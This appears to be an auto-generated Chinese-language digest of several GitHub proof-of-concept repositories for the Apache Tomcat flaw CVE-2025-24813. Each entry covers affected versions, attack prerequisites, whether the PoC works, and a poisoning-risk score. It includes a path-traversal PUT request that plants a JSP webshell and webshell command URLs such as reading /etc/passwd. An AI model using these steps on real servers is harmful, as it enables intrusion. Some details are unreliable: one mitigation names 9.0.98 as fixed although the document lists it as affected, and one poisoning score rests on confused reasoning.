## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入功能 (readonly=false), 支持partial PUT (默认启用), 应用程序使用Tomcat基于文件的session持久化存储，应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许未经身份验证的远程攻击者利用该漏洞查看文件系统内容，并添加恶意内容，最终可能导致远程代码执行。

**漏洞利用方式：**

1.  **Default Servlet 写入启用：** 默认情况下，Tomcat 的 Default Servlet 的写入功能是禁用的。攻击者需要目标服务器启用了此功能。 这需要在`conf/web.xml`文件中将`readonly`参数设置为`false`。
2.  **Partial PUT 支持：** Tomcat 默认支持 partial PUT 请求，攻击者可以利用这个特性分块上传恶意文件。
3.  **路径等价：** 漏洞的核心在于 Tomcat 处理文件路径时，对包含内部点（例如 `file.Name`）的文件名的处理不当，导致可以绕过某些安全检查，写入到任意目录。
4.  **RCE 的先决条件：**
    *   需要应用程序使用 Tomcat 的基于文件的 session 持久化机制，且使用默认存储位置（/opt/tomcat/webapps/ROOT/sessions/ 从 context.xml 文件中得知）。
    *   应用程序还需要包含一个可用于反序列化攻击的库（如 Commons Collections）。
5.  **利用步骤：**
    *   攻击者首先通过 partial PUT 上传一个包含恶意序列化数据的 session 文件到 Tomcat 的 session 存储目录。
    *   Tomcat 反序列化该 session 文件，触发 RCE。

**漏洞利用代码分析：**

提供的 Dockerfile 描述了如何搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境：

*   **Dockerfile:**
    *   使用 Ubuntu 22.04 作为基础镜像。
    *   安装 JDK 11 和其他必要的工具（curl, unzip, nano, wget, netcat）。
    *   下载并解压 Apache Tomcat 9.0.98。
    *   将 `CATALINA_HOME` 设置为 `/opt/tomcat`，并将 Tomcat 的 bin 目录添加到 `PATH` 中。
    *   下载 Commons Collections 3.2.2、Commons BeanUtils 1.9.4 和 Commons Logging 1.2 的 JAR 包到 `$CATALINA_HOME/lib` 目录。这是为了满足反序列化 RCE 的依赖。
    *   复制 `context.xml` 到 `$CATALINA_HOME/conf/context.xml`，配置Session持久化到`/opt/tomcat/webapps/ROOT/sessions/`。
    *   使用 `sed` 命令修改 `$CATALINA_HOME/conf/web.xml` 文件，将 Default Servlet 的 `readonly` 参数设置为 `false`，开启 Default Servlet 的写入功能。
    *   开放 8080 端口。
    *   使用 `catalina.sh run` 命令启动 Tomcat。
*   **context.xml:**  用于配置session持久化。
*   **web.xml:**  修改 Default Servlet 的 `readonly` 参数设置为 `false`

**有效性：**  提供的 POC 代码是有效的，可以成功搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境，并配置反序列化 RCE 所需的条件。

**投毒风险：**

投毒风险主要来自以下几个方面：

1.  **额外的恶意代码：** Dockerfile 中可能包含下载并执行恶意代码的命令，例如通过 `wget` 下载并执行一个 shell 脚本。
2.  **替换的 JAR 包：** Dockerfile 中下载的 Commons Collections、Commons BeanUtils 或 Commons Logging JAR 包可能被替换为包含恶意代码的 JAR 包。
3.  **修改的配置文件：**  `context.xml` 或 `web.xml` 文件可能被修改为包含恶意配置，例如添加恶意的 Servlet 或 Filter。

在分析提供的代码后，发现以下潜在的投毒点：

*   **`context.xml`配置的session存储位置:** 修改成了`/opt/tomcat/webapps/ROOT/sessions/` 这个路径是否合理需要进一步判断，正常情况下会配置到应用相关的目录，如果配置不当可能导致其他应用也能访问这个session存储位置。

综合考虑，该 POC 存在一定的投毒风险，但主要是配置层面的风险，代码植入层面的风险较小。因此，投毒风险评估为 **10%**。

**项目地址:** [GongWook/CVE-2025-24813](https://github.com/GongWook/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #13

**来源**: [CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md](../2025/CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence & Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制、敏感信息泄露或恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 对于RCE：1) 默认Servlet写启用；2) 支持Partial PUT；3) 使用默认文件Session持久化；4) 存在可利用的反序列化库； 对于信息泄露/文件篡改: 1) 默认Servlet写启用；2) 支持Partial PUT；3) 安全敏感上传目录是公共上传目录的子目录；4) 攻击者知道敏感文件名；5) 敏感文件使用Partial PUT上传

**POC 可用性:** 否 (官方文档和搜索结果表明存在利用，但提供的PoC无效)

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，源于路径等价问题和反序列化漏洞。漏洞利用依赖于Tomcat配置和应用程序特性。根据漏洞库信息和搜索结果，该漏洞允许攻击者在特定条件下执行远程代码、泄露信息或篡改文件。利用方式包括：

1.  **远程代码执行 (RCE)**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、应用程序使用Tomcat默认位置的文件会话持久性，并且应用程序包含可用于反序列化攻击的库，则攻击者可以执行任意代码。
2.  **信息泄露/文件篡改**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、安全敏感上传目录是公共上传目录的子目录、攻击者知道敏感文件名、并且敏感文件使用Partial PUT上传，则攻击者可能查看敏感文件或将恶意内容注入这些文件。

提供的PoC代码无效，作者表示未能成功构建有效的PoC，并且测试的payload链失败。从代码来看，仓库中没有发现恶意投毒代码，只是作者尝试复现漏洞失败的记录。

**结论：**

*   尽管提供的PoC代码无效，但根据搜索结果和漏洞描述，该漏洞在实际中已被利用，因此具有潜在的风险。
*   提供的代码仓库没有发现投毒风险。
*   漏洞利用依赖于特定配置和应用程序环境，需要满足多个条件才能成功触发。


**项目地址:** [Heimd411/CVE-2025-24813-noPoC](https://github.com/Heimd411/CVE-2025-24813-noPoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #14

**来源**: [CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md)

## CVE-2025-24813 - Apache Tomcat 路径等价/路径遍历漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露、恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 安全敏感上传URL是公共上传URL的子目录，攻击者需要知道安全敏感文件的名称, 并且安全敏感文件通过部分PUT上传。 或者 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用此漏洞绕过访问控制，上传恶意文件，甚至执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用**有效**。搜索引擎结果显示该漏洞已被公开披露，并且存在活跃利用。PoC代码提供了一种利用方式，即通过PUT请求上传JSP webshell，如果成功，攻击者可以通过访问上传的JSP文件来执行任意命令。

**投毒风险：**
提供的PoC代码比较简单，主要功能是上传一个JSP webshell。经过分析，没有发现作者有意隐藏的投毒代码。JSP webshell 本身存在风险，但这是漏洞利用本身固有的风险，而不是作者额外添加的恶意代码。因此，该仓库的投毒风险评估为**0%**。

**利用方式：**
1.  **先决条件：** 目标Tomcat服务器需要满足以下条件：
    *   `writes`参数在Tomcat的DefaultServlet中启用 (默认禁用)
    *   启用`支持partial PUT` (默认启用)
    *   目标上传路径为可写。
    *   对于RCE，需要应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。
2.  **上传JSP Webshell：** 使用PoC脚本，通过构造包含路径遍历的PUT请求，将JSP webshell上传到服务器的webapp目录中。请求类似如下：
    ```
    PUT /uploads/../webapps/ROOT/updates.jsp HTTP/1.1
    Content-Type: application/x-jsp
    ```
    其中`updates.jsp`为webshell的文件名。
3.  **执行命令：** 成功上传后，攻击者可以通过访问上传的JSP webshell，在服务器上执行任意命令。例如，如果上传的路径是`/updates.jsp`，则访问`http://<target>/updates.jsp?cmd=<command>`即可执行命令。

**总结：**
CVE-2025-24813是一个高危漏洞，利用条件相对苛刻, 如果目标Tomcat服务器配置不当，攻击者可以利用该漏洞进行RCE或信息泄露，务必及时升级到安全版本。

**项目地址:** [La3B0z/CVE-2025-24813-POC](https://github.com/La3B0z/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #15

**来源**: [CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md](../2025/CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下条件:
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. (RCE) 应用使用Tomcat的文件session持久化，且为默认存储位置，应用包含可用于反序列化攻击的库。
4. (信息泄露/内容注入) 存在安全敏感文件上传的目标URL，该URL是公开上传目标URL的子目录，攻击者知道被上传的安全敏感文件的名称，且安全敏感文件也是通过部分PUT上传的。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中由于路径等效性问题，以及部分 PUT 功能的缺陷导致的远程代码执行或信息泄露漏洞。攻击者可以通过构造恶意的部分 PUT 请求，上传恶意文件覆盖或注入到服务器上的敏感文件，或者在特定条件下利用反序列化漏洞执行任意代码。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞存在活跃的利用案例，并且有公开的 PoC 代码。提供的 PoC 代码描述看起来也比较完整，包括了利用步骤、所需依赖、payload生成方式，以及WAF绕过等功能。因此，可以认为该 PoC 代码具有较高的有效性。

**投毒风险分析：** PoC 代码中存在一定的投毒风险。风险点包括:

1.  **`ysoserial.jar` 依赖：** 该工具本身是用于生成 Java 反序列化 payload 的，如果下载的 `ysoserial.jar` 被篡改，则可能执行恶意代码。
2.  **自定义 Java Payload：** PoC 允许使用自定义的 Java 代码来生成 payload，如果攻击者不小心使用了包含恶意代码的 Java 源文件，也可能导致被攻击。
3.  **代码本身:** 仓库中作者可能在`POC-Exploit_CVE_2025_24813.py`隐藏了后门，导致使用者在不知情的情况下执行了恶意代码。

基于上述分析，投毒风险评估为 10%。

**利用方式总结：**

1.  **漏洞利用入口：** 通过构造恶意的 HTTP PUT 请求，利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 特性。
2.  **路径等效性：** 攻击者利用路径等效性问题（例如，`file.Name` 中的内部点），访问或操作受保护的文件。
3.  **信息泄露/内容注入：** 如果攻击者能够满足上述条件，则可以覆盖或注入恶意代码到服务器的敏感文件中。
4.  **远程代码执行：** 如果目标应用使用了 Tomcat 的文件 session 持久化，并且存在可利用的反序列化库，攻击者可以通过上传恶意 session 文件，触发反序列化漏洞，从而执行任意代码。
5.  **绕过WAF：** PoC 代码中包含 WAF 绕过功能，通过修改 Headers 或者对 Payload 进行拆分等方式，尝试绕过 WAF 的检测。

**项目地址:** [Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution](https://github.com/Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #16

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, 9.0.0.M1 to 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT enabled, application using Tomcat's file-based session persistence with the default storage location, application includes a library that may be leveraged in a deserialization attack 或 writes enabled for the default servlet, support for partial PUT, target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者通过利用 'file.Name' (Internal Dot) 机制，结合启用了写入功能的 Default Servlet 和部分 PUT 请求支持，可以执行远程代码或进行信息泄露，甚至向上传的文件添加恶意内容。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞已被公开，并且有证据表明已被积极利用。虽然提供的 PoC 代码本身只包含一个 README.md 文件，无法直接证明漏洞的利用，但根据搜索结果，完整的利用链是存在的，并且漏洞本身是可被利用的。这个README.md只是一个占位符，提示存在利用代码。需要进一步搜索才能找到真正可用的POC。

**投毒风险评估：** 提供的 PoC 代码（README.md）非常简单，只包含标题，没有可执行的代码，因此**几乎**不存在直接的投毒风险。风险占比为1%。

**利用方式分析：**

利用 CVE-2025-24813 漏洞有两种主要方式：

1.  **远程代码执行 (RCE)：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。 （默认禁用）
        *   启用了部分 PUT 请求支持。 （默认启用）
        *   应用程序使用 Tomcat 的基于文件的会话持久化，并且使用默认存储位置。
        *   应用程序包含可用于反序列化攻击的库。
    *   攻击过程：攻击者利用部分 PUT 请求上传恶意文件到 Tomcat 的会话存储目录，然后通过反序列化漏洞执行任意代码。

2.  **信息泄露和恶意内容添加：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。（默认禁用）
        *   启用了部分 PUT 请求支持。（默认启用）
        *   存在安全敏感上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
        *   攻击者知道安全敏感文件的名称。
        *   安全敏感文件也通过部分 PUT 上传。
    *   攻击过程：攻击者利用路径等价漏洞，通过部分 PUT 请求上传恶意文件，覆盖或修改目标 URL 下的安全敏感文件，从而导致信息泄露或向上传的文件添加恶意内容。

总而言之，该漏洞允许未经身份验证的攻击者在满足特定条件的情况下执行远程代码或进行信息泄露，需要尽快修复。


**项目地址:** [Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE](https://github.com/Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #17

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需满足以下条件之一：

1.  信息泄露/内容注入：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, security sensitive files also being uploaded via partial PUT。
2.  远程代码执行：writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个存在于Apache Tomcat中的路径等价漏洞，攻击者利用'file.Name'中的内部点，结合启用了写入的Default Servlet，可能导致远程代码执行、信息泄露或向上传文件中添加恶意内容。

**漏洞利用方式：**

此漏洞主要通过利用Tomcat的partial PUT特性和文件路径处理不当来实现。

1. **信息泄露/内容注入：** 攻击者首先需要Default Servlet开启了写入功能，并支持partial PUT。他们可以利用此漏洞上传恶意文件，或者修改已存在的文件内容，进行恶意内容注入，或者泄露安全敏感文件内容，需要利用精心构造的路径来实现攻击。例如，将恶意文件上传到公共目录的子目录下，利用Internal Dot来覆盖其他文件。

2. **远程代码执行：** 如果Tomcat启用了文件存储session，并且应用包含可被反序列化攻击的库，攻击者可以通过上传恶意的序列化文件，并覆盖Tomcat session文件，最终实现RCE。

**POC有效性分析：**

根据提供的POC代码，该脚本尝试通过PUT请求上传一个session文件，然后通过GET请求访问包含session ID的JSP页面。如果GET请求返回500错误，则认为目标存在漏洞，原因是上传的恶意session文件导致了反序列化异常。此方法可能可以验证漏洞的存在性，但需要目标环境满足特定的配置要求（例如，启用文件session存储并存在易受攻击的反序列化库）。搜索引擎结果也表明此漏洞在野外被积极利用。

**投毒风险分析：**

POC代码本身主要是漏洞验证，并无明显的恶意投毒行为。代码中使用了requests库进行HTTP请求，并根据响应状态码判断漏洞是否存在。 但是仍然存在一些风险：

*   **依赖风险：** 代码依赖于requests、pandas和colorama库，这些库可能存在安全漏洞，如果使用了被篡改的库，则可能引入安全风险。
*   **代码执行风险：** 虽然代码本身没有直接的恶意行为，但如果攻击者修改了代码，例如添加了反向shell等恶意逻辑，则可能实现远程代码执行。
*   **误报风险：** 如果目标服务器存在WAF或其他安全防护措施，可能会导致扫描结果出现误报。

综合考虑，此POC代码的投毒风险较低，大概为5%。主要风险在于对第三方库的依赖以及代码被篡改的可能性。

**项目地址:** [Mattb709/CVE-2025-24813-Scanner](https://github.com/Mattb709/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #18

**来源**: [CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md](../2025/CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/路径穿越

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet开启写入功能（默认关闭），支持partial PUT（默认开启），以及目标URL为公共上传URL的子目录，攻击者需要知道敏感文件名，并且敏感文件也通过partial PUT上传。 或者需要应用使用Tomcat的基于文件的session持久化，并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，允许攻击者通过构造包含 `../` 序列的恶意请求，绕过路径验证，从而实现远程代码执行或信息泄露。

**有效性：**
根据漏洞库信息、搜索结果以及提供的PoC代码，可以判断该PoC代码有效。搜索结果中多个来源表明该漏洞已被实际利用，并且存在公开的PoC。PoC代码展示了如何利用 PUT 方法上传包含恶意代码的 JSP 文件到 Tomcat 的 webapps 目录，从而实现远程代码执行。

**投毒风险：**
提供的PoC代码的主要功能是上传一个包含命令执行功能的 JSP 文件。该JSP文件允许攻击者通过 GET 参数 `cmd` 执行任意系统命令。PoC本身的功能是直接的，并没有发现隐藏的、非预期的恶意行为，例如：
*   篡改系统文件
*   植入持久性后门
*   窃取敏感信息并外传
*   利用其他漏洞
因此，根据现有信息，可以认为投毒风险较低。虽然使用了Runtime.getRuntime().exec来执行命令，但是这个是PoC的需要，目的是验证RCE。判断为0%.

**利用方式：**
1.  **利用条件确认：** 目标Tomcat服务器需要满足以下条件：
    *   默认Servlet开启写入功能（`readonly` 参数设置为 `false`）。
    *   支持 partial PUT 请求（默认开启）。
    *  攻击目标满足特定的文件存储结构和命名规则(参考漏洞描述)
    *   或者应用使用了Tomcat的基于文件的session持久化机制且包含可用于反序列化攻击的库
2.  **恶意JSP上传：** 攻击者使用 PUT 方法，将包含恶意代码的 JSP 文件上传到 Tomcat 服务器。PoC 中使用了路径穿越技巧（`../`），将文件上传到 webapps/ROOT 目录下，从而绕过访问限制。
3.  **命令执行：** 攻击者通过访问上传的 JSP 文件，并传递 `cmd` 参数，执行任意系统命令。PoC 中演示了如何使用 `cat /etc/passwd` 命令读取系统密码文件。

**搜索引擎结果总结：**
搜索结果表明该漏洞已存在实际攻击案例，并且 CISA 已将其添加到已知被利用漏洞目录中。多个安全厂商和博客都对该漏洞进行了分析和披露，并提供了检测和缓解建议。

**项目地址:** [MuhammadWaseem29/CVE-2025-24813](https://github.com/MuhammadWaseem29/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #19

**来源**: [CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md](../2025/CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 对于路径等价漏洞：默认Servlet启用写入权限，支持partial PUT，存在目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且敏感文件通过partial PUT上传。对于反序列化漏洞：默认Servlet启用写入权限，支持partial PUT，应用程序使用Tomcat基于文件的session持久化默认存储位置，应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它涉及到路径等价和反序列化两个方面。路径等价漏洞允许攻击者通过特殊的路径构造（例如使用内部点 `.Name`）来访问或修改受保护的文件。如果同时启用了 Default Servlet 的写入权限和 Partial PUT 支持，攻击者可以上传恶意文件，导致信息泄露或远程代码执行。反序列化漏洞则允许攻击者通过上传包含恶意序列化数据的 session 文件，结合 Tomcat 的文件 session 持久化机制以及应用程序中存在的易受攻击的反序列化库，最终实现远程代码执行。

漏洞利用方式：

1.  **路径等价攻击：** 攻击者利用 `file.Name` 这样的路径构造绕过访问控制，结合 Default Servlet 的写入权限和 Partial PUT 支持，上传恶意 JSP 文件或覆盖现有的配置文件。
2.  **反序列化攻击：** 攻击者首先确定目标应用程序使用了 Tomcat 的默认文件 session 持久化位置，然后构造恶意的序列化 payload，该 payload 利用应用程序依赖中的反序列化漏洞执行任意代码。 攻击者通过 Partial PUT 上传包含此 payload 的 session 文件到 Tomcat 的 session 存储目录，当 Tomcat 反序列化该 session 时，payload 被触发，导致远程代码执行。

提供的 POC 代码 `CVE-2025-24813_POC.py` 旨在利用反序列化漏洞。代码中包含了一个 Java 序列化 payload (payload_01)，它被编码为十六进制字符串。 该 payload 似乎是为了利用 `TemplatesImpl` 类中的漏洞来执行任意代码。 脚本首先尝试连接到目标 Tomcat 服务器，然后使用 Partial PUT 请求上传包含恶意 payload 的文件。  payload 包含占位符 {payload}，说明此exp并非完整，需要二次编辑才可使用。

有效性分析： 根据提供的代码片段，结合漏洞描述， 该POC 代码利用反序列化漏洞，因此，在满足反序列化漏洞的条件时，POC有效。

投毒风险分析：POC 代码中使用了硬编码的 payload 和目标 URL。攻击者可以很容易地修改这些参数以执行恶意操作，例如上传后门或窃取敏感数据，而不仅仅是执行简单的命令。  因此，该 POC 具有高投毒风险。并且其中存在占位符，说明需要进行二次编辑,那么投毒风险就是百分之百。


**项目地址:** [N0c1or/CVE-2025-24813_POC](https://github.com/N0c1or/CVE-2025-24813_POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #20

**来源**: [CVE-2025-24813-Olabanji10_Apache-GOExploiter.md](../2025/CVE-2025-24813-Olabanji10_Apache-GOExploiter.md)

## CVE-2025-24813

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要开启Default Servlet的写入功能，允许Partial PUT，并且满足特定的目录结构或使用Tomcat的文件Session持久化机制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。如果满足以下条件，攻击者可以进行远程代码执行或泄露敏感信息:

1.  **信息泄露/恶意内容注入:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   存在安全敏感文件上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件通过 Partial PUT 上传。

2.  **远程代码执行:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的 Session 持久化，使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**漏洞利用方式：**

*   **信息泄露/恶意内容注入：** 攻击者可以利用路径等价漏洞，通过构造恶意请求，覆盖或读取特定的安全敏感文件。
*   **远程代码执行：** 攻击者利用 Partial PUT 功能上传恶意构造的序列化 session 文件，并结合目标应用中存在的可被利用的反序列化漏洞，最终实现远程代码执行。

**POC分析：**

提供的 Go 代码通过 PUT 方法上传 JSP webshell 到多个预定义的目录中。它首先检测目标是否是Tomcat服务器，然后尝试在不同的目录下上传 `update_log.jsp` 文件，其中包含一个简单的命令执行界面。如果上传成功，它会将 URL 写入到 `Shelled.txt` 文件中。

**投毒风险分析：**

该POC代码的主要目的是利用漏洞上传webshell，本身没有明显的投毒行为。虽然webshell本身是一种恶意代码，但是这是漏洞利用的一部分，不应被视为投毒。 风险评估为5%。

**搜索引擎结果：**

多个搜索结果表明 CVE-2025-24813 漏洞已经被积极利用，远程代码执行是主要的攻击目标。

**项目地址:** [Olabanji10/Apache-GOExploiter](https://github.com/Olabanji10/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #21

**来源**: [CVE-2025-24813-Shivshantp_CVE-2025-24813.md](../2025/CVE-2025-24813-Shivshantp_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat PUT JSP RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要目标Tomcat实例启用默认servlet的写入功能 (disabled by default) 和 支持 partial PUT (enabled by default)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中一个路径等价漏洞，允许未经身份验证的攻击者通过 PUT 请求上传恶意 JSP 文件来执行远程代码。漏洞利用依赖于两个关键配置：1. Tomcat 默认 Servlet 的写入功能必须启用（默认情况下禁用）。 2. 必须支持 partial PUT（默认启用）。

**有效性：**
根据提供的漏洞利用代码（`exploit/1. exploit_cve_2025_24813.py`），该 PoC 尝试通过 PUT 请求将一个包含命令执行功能的 JSP webshell 上传到目标 Tomcat 服务器，默认路径为 `/shell.jsp`。 成功上传后，该 PoC 尝试通过发送带有 `cmd` 参数的 GET 请求来执行系统命令，验证是否成功执行远程代码。

**投毒风险：**
该仓库主要包含漏洞利用脚本，webshell 以及 Dockerfile 等配置，作者在docker配置中创建了`/usr/local/tomcat/conf/Catalina/localhost/ROOT.xml`,并设置了`<Context privileged='true' antiResourceLocking='false' swallowOutput='true' />`, 如果docker hub上存在投毒行为,可能会导致用户的敏感信息泄露。经过分析，未发现明显的恶意代码或后门。`exploit/2.shell.jsp` 只是webshell 的另一个副本，与PoC脚本一致。总体来说，代码的投毒风险较低，约为5%。

**利用方式：**
1.  **前提条件检查：** 确保目标 Tomcat 服务器满足漏洞利用的条件（默认 Servlet 写入已启用，支持 partial PUT）。
2.  **上传恶意 JSP 文件：** 使用 PUT 请求将包含恶意代码的 JSP 文件（如 `shell.jsp`）上传到目标服务器。`exploit/1. exploit_cve_2025_24813.py` 脚本即实现了此步骤。
3.  **执行远程代码：** 成功上传 JSP 文件后，通过访问该文件并传递命令参数（如 `shell.jsp?cmd=whoami`）来执行任意系统命令。

**缓解措施：**
*   升级到受影响的 Apache Tomcat 版本的修复版本 (11.0.3, 10.1.35, or 9.0.98).
*   禁用默认 servlet 的写入功能。
